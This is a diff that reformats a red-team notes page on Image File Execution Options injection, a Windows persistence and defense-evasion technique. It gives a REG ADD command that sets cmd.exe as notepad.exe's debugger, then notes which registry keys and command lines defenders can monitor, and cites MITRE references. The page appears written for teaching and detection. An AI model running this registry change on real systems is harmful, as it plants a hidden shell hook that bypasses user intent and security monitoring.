@@ -1,5 +1,6 @@
 ---
 description: 'Defense Evasion, Persistence, Privilege Escalation'
+tags: [#defense-evasion, #privilege-escalation, #persistence]
 ---
 
 # Image File Execution Options Injection
@@ -8,33 +9,32 @@ description: 'Defense Evasion, Persistence, Privilege Escalation'
 
 Modifying registry to set cmd.exe as notepad.exe debugger, so that when notepad.exe is executed, it will actually start cmd.exe:
 
-{% code title="attacker@victim" %}
 ```csharp
+// attacker@victim
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /d "cmd.exe"
 ```
-{% endcode %}
 
 Launching a notepad on the victim system:
 
-![](../../.gitbook/assets/ifeo-notepad.png)
+![[ifeo-notepad.png]]
 
 Same from the cmd shell:
 
-![](../../.gitbook/assets/ifeo-notepad2.png)
+![[ifeo-notepad2.png]]
 
 ## Observations
 
 Monitoring command line arguments and events modifying registry keys: `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options/<executable>` and `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable>` should be helpful in detecting this attack:
 
-![](../../.gitbook/assets/ifeo-cmdline.png)
+![[ifeo-cmdline.png]]
 
-![](../../.gitbook/assets/ifeo-cmdline2.png)
+![[ifeo-cmdline2.png]]
 
 ## References
 
-{% embed url="https://attack.mitre.org/wiki/Technique/T1183" %}
+[attack.mitre.org/wiki/Technique/T1183](https://attack.mitre.org/wiki/Technique/T1183)
 
-{% embed url="https://blogs.msdn.microsoft.com/mithuns/2010/03/24/image-file-execution-options-ifeo/" %}
+[blogs.msdn.microsoft.com/mithuns/2010/03/24/image-file-execution-options-ifeo](https://blogs.msdn.microsoft.com/mithuns/2010/03/24/image-file-execution-options-ifeo/)
 
-{% embed url="https://blogs.msdn.microsoft.com/reiley/2011/07/29/a-debugging-approach-to-ifeo/" %}
+[blogs.msdn.microsoft.com/reiley/2011/07/29/a-debugging-approach-to-ifeo](https://blogs.msdn.microsoft.com/reiley/2011/07/29/a-debugging-approach-to-ifeo/)
 
